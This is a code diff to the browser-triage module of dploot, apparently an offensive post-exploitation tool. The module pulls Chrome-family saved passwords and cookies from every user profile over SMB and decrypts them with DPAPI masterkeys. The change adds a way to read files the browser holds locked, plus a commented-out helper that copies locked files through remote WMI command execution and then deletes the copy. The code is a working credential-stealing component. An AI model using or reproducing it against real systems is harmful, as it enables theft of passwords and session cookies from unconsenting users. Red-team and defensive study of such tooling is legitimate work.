@@ -4,6 +4,7 @@ import logging
 import ntpath
 import tempfile
 import sqlite3
+import time
 from typing import List, Tuple
 from dploot.lib.crypto import decrypt_chrome_password
 
@@ -11,6 +12,7 @@ from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
 from dploot.lib.smb import DPLootSMBConnection
 from dploot.lib.target import Target
 from dploot.lib.utils import datetime_to_time
+from dploot.lib.wmi import DPLootWmiExec
 from dploot.triage.masterkeys import Masterkey
 
 class LoginData:
@@ -76,13 +78,13 @@ class BrowserTriage:
         self.target = target
         self.conn = conn
         
-        self._is_admin = None
         self._users = None
         self.looted_files = dict()
         self.masterkeys = masterkeys
 
     def triage_browsers(self) -> Tuple[List[LoginData], List[Cookie]]:
-        credentials, cookies = list()
+        credentials = list()
+        cookies = list()
 
         for user in self.users:
             try:
@@ -90,7 +92,10 @@ class BrowserTriage:
                 credentials += user_credentials
                 cookies += user_cookies
             except Exception as e:
-                print(str(e))
+                if logging.getLogger().level == logging.DEBUG:
+                    import traceback
+                    traceback.print_exc()
+                    logging.debug(str(e))
                 pass
         return credentials, cookies
 
@@ -98,10 +103,11 @@ class BrowserTriage:
         return self.triage_chrome_browsers_for_user(user=user)
 
     def triage_chrome_browsers_for_user(self,user:str) -> Tuple[List[LoginData], List[Cookie]]:
-        credentials, cookies = list()
+        credentials = list()
+        cookies = list()
         for browser,paths in self.user_generic_chrome_paths.items():
             aeskey = None
-            aesStateKey_bytes = self.conn.readFile(shareName=self.share, path=paths['aesStateKeyPath'] % user)
+            aesStateKey_bytes = self.conn.readFile(shareName=self.share, path=paths['aesStateKeyPath'] % user, bypass_shared_violation=True)
             if aesStateKey_bytes is not None and len(aesStateKey_bytes) > 0:
                 logging.debug('Found %s AppData files for user %s' % (browser.upper(), user))
                 aesStateKey_json = json.loads(aesStateKey_bytes)
@@ -112,7 +118,7 @@ class BrowserTriage:
                     if masterkey is not None:
                         aeskey = decrypt_blob(blob_bytes=dpapi_blob, masterkey=masterkey)
 
-            loginData_bytes = self.conn.readFile(shareName=self.share, path=paths['loginDataPath'] % user)
+            loginData_bytes = self.conn.readFile(shareName=self.share, path=paths['loginDataPath'] % user, bypass_shared_violation=True)
             if aeskey is not None and loginData_bytes is not None and len(loginData_bytes) > 0:
                 fh = tempfile.NamedTemporaryFile()
                 fh.write(loginData_bytes)
@@ -134,7 +140,7 @@ class BrowserTriage:
                 fh.close()
 
 
-            cookiesData_bytes = self.conn.readFile(shareName=self.share, path=paths['cookiesDataPath'] % user)
+            cookiesData_bytes = self.conn.readFile(shareName=self.share, path=paths['cookiesDataPath'] % user, bypass_shared_violation=True)
             if aeskey is not None and cookiesData_bytes is not None and len(cookiesData_bytes) > 0:
                 fh = tempfile.NamedTemporaryFile()
                 fh.write(cookiesData_bytes)
@@ -160,13 +166,23 @@ class BrowserTriage:
                 fh.close()
         return credentials, cookies
 
-    @property
-    def is_admin(self) -> bool:
-        if self._is_admin is not None:
-            return self._is_admin
-
-        self._is_admin = self.conn.is_admin()
-        return self._is_admin
+    # def readFile_through_wmi(self, shareName, filepath):
+    #     wmiexec = DPLootWmiExec(target=self.target)
+    #     command = "cmd.exe /Q /c copy \"C:\\%s\" \"C:\\%s\"" % (filepath,wmiexec.output)
+    #     # command = "cmd.exe /Q /c esentutl.exe /y \"C:\\%s\" /d \"C:\\%s\"" % (path,'bonjour')
+    #     wmiexec.run(command)
+    #     while True:
+    #         try:
+    #             data = self.conn.readFile(shareName=shareName, path=wmiexec.output)
+    #             break
+    #         except Exception as e:
+    #             if str(e).find('STATUS_SHARING_VIOLATION') >=0:
+    #                 # Output not finished, let's wait
+    #                 time.sleep(1)
+    #                 print("hey "+str(e))
+    #                 pass
+    #     self.conn.sb.deleteFile(shareName, wmiexec.output)
+    #     return data
 
     @property
     def users(self) -> List[str]:
